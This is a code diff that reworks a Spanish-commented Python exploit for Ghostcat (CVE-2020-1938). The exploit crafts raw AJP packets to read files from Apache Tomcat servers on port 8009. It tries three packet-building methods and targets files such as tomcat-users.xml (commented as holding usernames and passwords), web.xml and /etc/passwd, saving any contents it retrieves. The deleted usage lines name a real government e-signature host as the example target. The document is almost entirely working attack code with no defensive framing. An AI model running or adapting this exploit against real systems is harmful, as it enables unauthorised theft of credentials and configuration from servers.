@@ -1,284 +1,401 @@
 #!/usr/bin/env python3
 """
-Ghostcat - CVE-2020-1938 Exploit
-Lee archivos del Tomcat via AJP connector (puerto 8009)
-Uso: python3 ghostcat.py <host> [archivo]
+Ghostcat CVE-2020-1938 - Versión mejorada
+Soporta múltiples métodos de explotación
 """
-
 import socket
-import sys
 import struct
+import sys
+import time
 
-def pack_ajp_header(method, host, uri, headers=None):
-    """Empaqueta un request AJP"""
-    data = b''
+class AJPClient:
+    def __init__(self, host, port=8009):
+        self.host = host
+        self.port = port
+        self.sock = None
     
-    # Forward Request prefix
-    prefix_code = 0x02  # FORWARD_REQUEST
-    method_code = {
-        'GET': 2,
-        'POST': 4,
-        'HEAD': 3,
-        'OPTIONS': 1,
-        'PUT': 5,
-        'DELETE': 6,
-        'TRACE': 7
-    }.get(method.upper(), 2)
+    def connect(self):
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.settimeout(5)
+            self.sock.connect((self.host, self.port))
+            return True
+        except Exception as e:
+            print(f"[-] Error de conexión: {e}")
+            return False
     
-    # Protocol, method, headers
-    data += struct.pack('!BB', prefix_code, method_code)
+    def close(self):
+        if self.sock:
+            self.sock.close()
     
-    # Protocol version (HTTP/1.1)
-    data += b'\x00\x01'  # 1.1
-    data += b'\x00\x00'  # host length (0 = use request host)
-    data += b'\x00\x00'  # address length
-    data += b'\x00\x00'  # server name length
-    data += struct.pack('!H', 8009)  # server port
-    data += b'\x00'  # is_ssl
+    def send_raw(self, data):
+        try:
+            self.sock.send(data)
+            time.sleep(1)
+            response = b''
+            while True:
+                try:
+                    chunk = self.sock.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+                    if len(response) > 50000:
+                        break
+                except socket.timeout:
+                    break
+            return response
+        except Exception as e:
+            print(f"[-] Error enviando: {e}")
+            return None
     
-    # Number of headers
-    all_headers = {
-        'accept-language': 'en-US,en;q=0.5',
-    }
-    if headers:
-        all_headers.update(headers)
-    all_headers['host'] = host
-    all_headers['accept-charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.3'
+    def cpong_send(self):
+        """Envía CPong para mantener viva la conexión"""
+        self.sock.send(b'\x12\x34\x00\x01\x09')
     
-    data += struct.pack('!H', len(all_headers))
+    def cping(self):
+        """Envía CPing y espera CPong"""
+        if not self.connect():
+            return False
+        try:
+            self.sock.send(b'\x12\x34\x00\x01\x0a')
+            time.sleep(0.5)
+            response = self.sock.recv(1024)
+            if response and len(response) >= 5:
+                if response[0:2] == b'\x41\x42' and response[4] == 0x09:
+                    print("[+] AJP respondió a CPing - Servicio activo")
+                    return True
+            print("[-] No se recibió CPong, pero el puerto está abierto")
+            return True
+        except Exception as e:
+            print(f"[-] Error CPing: {e}")
+            return False
+        finally:
+            self.close()
     
-    # Headers
-    for key, value in all_headers.items():
-        # Header name
-        encoded_key = key.encode('utf-8')
-        if len(encoded_key) > 0x7fff:
-            encoded_key = encoded_key[:0x7fff]
-        data += struct.pack('!H', len(encoded_key))
-        data += encoded_key
-        data += b'\x00'  # null terminator
+    def forward_request(self, uri, method='GET', file_to_read=None):
+        """Envía FORWARD_REQUEST con path traversal"""
+        if not self.connect():
+            return None
         
-        # Header value
-        encoded_value = value.encode('utf-8')
-        if len(encoded_value) > 0x7fff:
-            encoded_value = encoded_value[:0x7fff]
-        data += struct.pack('!H', len(encoded_value))
-        data += encoded_value
-        data += b'\x00'  # null terminator
-    
-    # Attributes (request_uri, etc)
-    attributes = {
-        'req_attribute': [
-            ('remote_user', b''),
-            ('auth_type', b''),
-            ('query_string', b''),
-            ('jvm_route', b''),
-            ('secret', b''),
-        ]
-    }
-    
-    # request_uri attribute
-    encoded_uri = uri.encode('utf-8')
-    data += b'\x0B'  # CODE_REQ_ATTRIBUTE
-    data += b'\x00\x0B'  # "request_uri" length
-    data += b'request_uri'
-    data += struct.pack('!H', len(encoded_uri))
-    data += encoded_uri
-    data += b'\x00'
-    
-    # Terminator
-    data += b'\xFF'
-    
-    return data
-
-
-def send_ajp(host, port, method, uri, file_to_read=None):
-    """Envía request AJP y recibe respuesta"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)
-    
-    try:
-        sock.connect((host, port))
-    except Exception as e:
-        print(f"[-] Error conectando a {host}:{port}: {e}")
-        return None
-    
-    # Construir el ataque Ghostcat:
-    # Inyectar path traversal en los atributos AJP
-    if file_to_read:
-        # Usar javax.servlet.include.path_info para path traversal
-        attributes = b''
+        # Construir el paquete FORWARD_REQUEST
+        prefix_code = 0x02
+        method_code = 0x02  # GET
         
-        # request_uri normal
-        uri_bytes = uri.encode('utf-8')
-        
-        # Construir el paquete manualmente para incluir path_info
-        prefix = b'\x02\x02'  # FORWARD_REQUEST + GET method
-        prefix += b'\x00\x01'  # HTTP/1.1
-        prefix += b'\x00\x00'  # host_len
-        prefix += b'\x00\x00'  # addr_len
-        prefix += b'\x00\x00'  # server_name_len
-        prefix += struct.pack('!H', 8009)  # port
-        prefix += b'\x00'  # is_ssl
+        # Datos iniciales
+        data = struct.pack('!BB', prefix_code, method_code)
+        data += b'\x00\x01'  # HTTP/1.1
+        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'  # host
+        data += b'\x00\x00'  # address
+        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'  # server_name
+        data += struct.pack('!H', 443)  # server_port
+        data += b'\x01'  # is_ssl (true)
         
         # Headers
-        prefix += b'\x00\x02'  # 2 headers
-        # Host header
-        prefix += b'\x00\x04' + b'host' + b'\x00'
-        prefix += struct.pack('!H', len(host)) + host.encode() + b'\x00'
-        # Accept header
-        prefix += b'\x00\x06' + b'accept' + b'\x00'
-        prefix += b'\x00\x03' + b'*/*' + b'\x00'
+        headers = {
+            'host': self.host,
+            'accept': '*/*',
+            'user-agent': 'Mozilla/5.0',
+            'connection': 'keep-alive'
+        }
+        data += struct.pack('!H', len(headers))
         
-        # request_uri attribute (CODE 0x0B)
-        prefix += b'\x0B'
-        prefix += struct.pack('!H', 11) + b'request_uri'
-        prefix += struct.pack('!H', len(uri_bytes)) + uri_bytes + b'\x00'
+        for key, value in headers.items():
+            key_bytes = key.encode()
+            val_bytes = value.encode()
+            data += struct.pack('!H', len(key_bytes)) + key_bytes + b'\x00'
+            data += struct.pack('!H', len(val_bytes)) + val_bytes + b'\x00'
         
-        # PATH_INFO ATTRIBUTE - Aquí va el path traversal
-        path_info = file_to_read.encode('utf-8')
-        prefix += b'\x0B'
-        key = b'javax.servlet.include.path_info'
-        prefix += struct.pack('!H', len(key)) + key
-        prefix += struct.pack('!H', len(path_info)) + path_info + b'\x00'
+        # Atributos
+        # request_uri (obligatorio)
+        uri_bytes = uri.encode()
+        data += b'\x0B'  # CODE = req_attribute
+        attr_name = b'request_uri'
+        data += struct.pack('!H', len(attr_name)) + attr_name
+        data += struct.pack('!H', len(uri_bytes)) + uri_bytes + b'\x00'
         
-        # SERVLET_PATH attribute
-        prefix += b'\x0B'
-        key2 = b'javax.servlet.include.servlet_path'
-        prefix += struct.pack('!H', len(key2)) + key2
-        prefix += b'\x00\x01' + b'/' + b'\x00'
+        # PATH_INFO con path traversal (el ataque real)
+        if file_to_read:
+            # Método 1: javax.servlet.include.path_info
+            attr_name = b'javax.servlet.include.path_info'
+            val_bytes = file_to_read.encode()
+            data += b'\x0B'
+            data += struct.pack('!H', len(attr_name)) + attr_name
+            data += struct.pack('!H', len(val_bytes)) + val_bytes + b'\x00'
+            
+            # Método 2: javax.servlet.include.servlet_path
+            attr_name = b'javax.servlet.include.servlet_path'
+            val_bytes = b'/'
+            data += b'\x0B'
+            data += struct.pack('!H', len(attr_name)) + attr_name
+            data += struct.pack('!H', len(val_bytes)) + val_bytes + b'\x00'
+        
+        # Terminador
+        data += b'\xFF'
+        
+        # Empaquetar con header AJP
+        ajp_header = b'\x12\x34' + struct.pack('!H', len(data))
+        full_packet = ajp_header + data
+        
+        print(f"[*] Enviando {len(full_packet)} bytes...")
+        response = self.send_raw(full_packet)
+        self.close()
+        return response
+    
+    def method2_direct_file(self, file_path):
+        """Método alternativo usando AJP con query string"""
+        if not self.connect():
+            return None
+        
+        # Construir request con file= en el URI
+        uri = f"/manager/html?file=../{file_path}"
+        
+        prefix_code = 0x02
+        method_code = 0x02
+        
+        data = struct.pack('!BB', prefix_code, method_code)
+        data += b'\x00\x01'
+        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'
+        data += b'\x00\x00'
+        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'
+        data += struct.pack('!H', 443)
+        data += b'\x01'
+        
+        headers = {
+            'host': self.host,
+            'accept': '*/*'
+        }
+        data += struct.pack('!H', len(headers))
+        for key, value in headers.items():
+            data += struct.pack('!H', len(key)) + key.encode() + b'\x00'
+            data += struct.pack('!H', len(value)) + value.encode() + b'\x00'
+        
+        # URI
+        uri_bytes = uri.encode()
+        data += b'\x0B'
+        data += struct.pack('!H', 11) + b'request_uri'
+        data += struct.pack('!H', len(uri_bytes)) + uri_bytes + b'\x00'
+        
+        # query_string
+        qs = f"file=../{file_path}".encode()
+        data += b'\x0B'
+        data += struct.pack('!H', 12) + b'query_string'
+        data += struct.pack('!H', len(qs)) + qs + b'\x00'
+        
+        data += b'\xFF'
+        
+        ajp_header = b'\x12\x34' + struct.pack('!H', len(data))
+        response = self.send_raw(ajp_header + data)
+        self.close()
+        return response
+    
+    def method3_wire_format(self, file_path):
+        """Método usando el formato binario exacto de AJPv13"""
+        if not self.connect():
+            return None
+        
+        file_bytes = file_path.encode()
+        host_bytes = self.host.encode()
+        
+        # Construcción manual byte por byte
+        packet = bytearray()
+        
+        # FORWARD_REQUEST
+        packet.append(0x02)  # prefix_code
+        packet.append(0x02)  # GET method
+        
+        # Protocol HTTP/1.1
+        packet.append(0x00)
+        packet.append(0x01)
+        
+        # Host (length-prefixed string)
+        packet.append(0x00)
+        packet.append(len(host_bytes))
+        packet.extend(host_bytes)
+        packet.append(0x00)  # null terminator
+        
+        # Address (empty)
+        packet.append(0x00)
+        packet.append(0x00)
+        
+        # Server name (empty)
+        packet.append(0x00)
+        packet.append(0x00)
+        
+        # Server port (443)
+        packet.append(0x01)
+        packet.append(0xBB)  # 443 en big-endian
+        
+        # is_ssl (true)
+        packet.append(0x01)
+        
+        # 1 header
+        packet.append(0x00)
+        packet.append(0x01)
+        
+        # Header: host
+        h_name = b'host'
+        h_val = host_bytes
+        packet.append(0x00)
+        packet.append(len(h_name))
+        packet.extend(h_name)
+        packet.append(0x00)
+        packet.append(0x00)
+        packet.append(len(h_val))
+        packet.extend(h_val)
+        packet.append(0x00)
+        
+        # request_uri
+        uri = b'/manager/html'
+        packet.append(0x0B)
+        packet.append(0x00)
+        packet.append(11)
+        packet.extend(b'request_uri')
+        packet.append(0x00)
+        packet.append(len(uri))
+        packet.extend(uri)
+        packet.append(0x00)
+        
+        # javax.servlet.include.path_info
+        attr = b'javax.servlet.include.path_info'
+        packet.append(0x0B)
+        packet.append(0x00)
+        packet.append(len(attr))
+        packet.extend(attr)
+        packet.append(0x00)
+        packet.append(len(file_bytes))
+        packet.extend(file_bytes)
+        packet.append(0x00)
+        
+        # javax.servlet.include.servlet_path
+        attr2 = b'javax.servlet.include.servlet_path'
+        val2 = b'/'
+        packet.append(0x0B)
+        packet.append(0x00)
+        packet.append(len(attr2))
+        packet.extend(attr2)
+        packet.append(0x00)
+        packet.append(len(val2))
+        packet.extend(val2)
+        packet.append(0x00)
         
         # Terminator
-        prefix += b'\xFF'
+        packet.append(0xFF)
         
-        full_packet = prefix
-    else:
-        full_packet = pack_ajp_header(method, host, uri)
-    
-    # AJP packet format: [0x12, 0x34, data_length (2 bytes), data, ...]
-    data_length = len(full_packet)
-    ajp_packet = b'\x12\x34' + struct.pack('!H', data_length) + full_packet
-    
-    try:
-        sock.send(ajp_packet)
+        # AJP Header
+        final = b'\x12\x34' + struct.pack('!H', len(packet)) + bytes(packet)
         
-        # Recibir respuesta
-        response = b''
-        while True:
-            try:
-                chunk = sock.recv(8192)
-                if not chunk:
-                    break
-                response += chunk
-                
-                # Leer header AJP de respuesta
-                if len(response) >= 4:
-                    if response[0:2] == b'\x41\x42':  # AJP Response
-                        resp_len = struct.unpack('!H', response[2:4])[0]
-                        if len(response) >= resp_len + 4:
-                            break
-            except socket.timeout:
-                break
-    except Exception as e:
-        print(f"[-] Error enviando datos: {e}")
-    finally:
-        sock.close()
-    
-    return response
+        response = self.send_raw(final)
+        self.close()
+        return response
 
 
-def parse_ajp_response(data):
-    """Parsea la respuesta AJP y extrae el contenido HTTP"""
+def parse_response(data):
+    """Extrae contenido útil de la respuesta AJP"""
     if not data or len(data) < 5:
-        return "Sin respuesta"
+        return None
     
-    # Skip header AJP (4 bytes: AB, AB, len1, len2)
+    # Buscar AJP Response
     if data[0:2] == b'\x41\x42':
         data = data[4:]
     
-    # Buscar el inicio de los datos de respuesta (SEND_BODY_CHUNK = 0x03)
+    # Buscar SEND_BODY_CHUNK (0x03) o datos HTTP
     result = b''
-    i = 0
     
+    # Método 1: buscar chunks
+    i = 0
     while i < len(data):
-        if data[i] == 0x03:  # SEND_BODY_CHUNK
+        if data[i] == 0x03:
             if i + 3 <= len(data):
                 chunk_len = struct.unpack('!H', data[i+1:i+3])[0]
-                if i + 3 + chunk_len <= len(data):
-                    result += data[i+3:i+3+chunk_len]
-                    i += 3 + chunk_len + 1  # +1 for null terminator
+                start = i + 3
+                end = start + chunk_len
+                if end <= len(data):
+                    result += data[start:end]
+                    i = end + 1
                     continue
-            break
-        elif data[i] == 0x04:  # END_RESPONSE
-            break
         i += 1
     
-    return result.decode('utf-8', errors='replace')
-
-
-def exploit_ghostcat(host, port, file_to_read):
-    """Ejecuta el exploit Ghostcat"""
-    print(f"\n[*] Objetivo: {host}:{port}")
-    print(f"[*] Archivo a leer: {file_to_read}")
-    print(f"[*] Ejecutando Ghostcat (CVE-2020-1938)...\n")
+    # Método 2: buscar HTTP/ en los datos
+    if not result:
+        http_pos = data.find(b'HTTP/')
+        if http_pos >= 0:
+            result = data[http_pos:]
     
-    # El URI no importa mucho, usamos /manager/html como señuelo
-    response = send_ajp(host, port, 'GET', '/', file_to_read=file_to_read)
-    
-    if response:
-        result = parse_ajp_response(response)
-        if result and len(result) > 10:
-            print(f"[+] ¡ÉXITO! Archivo obtenido ({len(result)} bytes):\n")
-            print(result)
-            return result
-        else:
-            print(f"[-] Respuesta recibida pero sin contenido útil ({len(response)} bytes total)")
-            print(f"[*] Headers raw: {response[:200]}")
-    else:
-        print("[-] No se recibió respuesta del servidor")
+    if result:
+        try:
+            return result.decode('utf-8', errors='replace')
+        except:
+            return str(result)
     
     return None
 
 
 def main():
     if len(sys.argv) < 2:
-        print("Ghostcat - CVE-2020-1938 Apache Tomcat AJP File Read")
+        print("Ghostcat CVE-2020-1938 - Versión Mejorada")
         print(f"Uso: {sys.argv[0]} <host> [archivo] [puerto]")
-        print(f"Ejemplo: {sys.argv[0]} efirma.veracruz.gob.mx WEB-INF/web.xml 8009")
-        print(f"Ejemplo: {sys.argv[0]} efirma.veracruz.gob.mx /etc/passwd 8009")
         sys.exit(1)
     
     host = sys.argv[1]
     port = int(sys.argv[3]) if len(sys.argv) > 3 else 8009
     
-    # Archivos a leer por defecto (los más útiles)
-    default_files = [
-        "WEB-INF/web.xml",           # Configuración web
-        "WEB-INF/classes/application.properties",  # Props de app
-        "conf/tomcat-users.xml",     # USUARIOS Y CONTRASEÑAS
-        "conf/server.xml",           # Configuración del servidor
-        "conf/web.xml",              # Configuración web global
-        "index.jsp",                 # Código fuente
-        "manager/WEB-INF/web.xml",   # Config del manager
-        "host-manager/WEB-INF/web.xml"  # Config del host-manager
+    files = [
+        "conf/tomcat-users.xml",
+        "WEB-INF/web.xml", 
+        "/etc/passwd",
+        "index.html",
+        "index.jsp"
     ]
     
     if len(sys.argv) > 2:
-        files_to_try = [sys.argv[2]]
-    else:
-        files_to_try = default_files
+        files = [sys.argv[2]]
     
-    for file_path in files_to_try:
-        result = exploit_ghostcat(host, port, file_path)
-        if result and len(result) > 100:
-            print(f"\n{'='*60}")
-            print(f"[+] ARCHIVO OBTENIDO: {file_path}")
-            print(f"{'='*60}")
+    client = AJPClient(host, port)
+    
+    # Verificar que el servicio responde
+    print(f"[*] Verificando AJP en {host}:{port}...")
+    if not client.cping():
+        print("[!] El servicio podría no ser AJP o está filtrado")
+    
+    for file_path in files:
+        print(f"\n{'='*50}")
+        print(f"[*] Intentando leer: {file_path}")
+        print(f"{'='*50}")
+        
+        # Probar los 3 métodos
+        for method_num, method_func in enumerate([
+            lambda: client.forward_request('/manager/html', file_to_read=file_path),
+            lambda: client.method2_direct_file(file_path),
+            lambda: client.method3_wire_format(file_path)
+        ], 1):
+            print(f"\n[*] Método {method_num}...")
+            response = method_func()
             
-            # Guardar a archivo
-            safe_name = file_path.replace('/', '_')
-            with open(f'/tmp/ghostcat_{safe_name}', 'w') as f:
-                f.write(result)
-            print(f"[*] Guardado en: /tmp/ghostcat_{safe_name}")
+            if response:
+                print(f"[*] Respuesta: {len(response)} bytes")
+                result = parse_response(response)
+                if result and len(result) > 10:
+                    print(f"[+] ¡EXITOSO! Contenido:\n")
+                    print(result[:2000])
+                    
+                    # Guardar
+                    safe_name = file_path.replace('/', '_').replace('.', '_')
+                    with open(f'tmp/ghostcat_{safe_name}.txt', 'w') as f:
+                        f.write(result)
+                    print(f"\n[*] Guardado: tmp/ghostcat_{safe_name}.txt")
+                    return
+                else:
+                    print(f"[-] Sin contenido extraíble")
+                    print(f"[D] Raw: {response[:200]}")
+            else:
+                print(f"[-] Sin respuesta")
+    
+    print("\n[!] Todos los métodos fallaron")
+    print("[*] Posibles razones:")
+    print("    1. El AJP requiere secret (conf/server.xml)")
+    print("    2. Tomcat tiene parche aplicado")
+    print("    3. El puerto 8009 es otro servicio")
+    print("    4. Firewall está bloqueando tráfico AJP")
 
 
 if __name__ == "__main__":
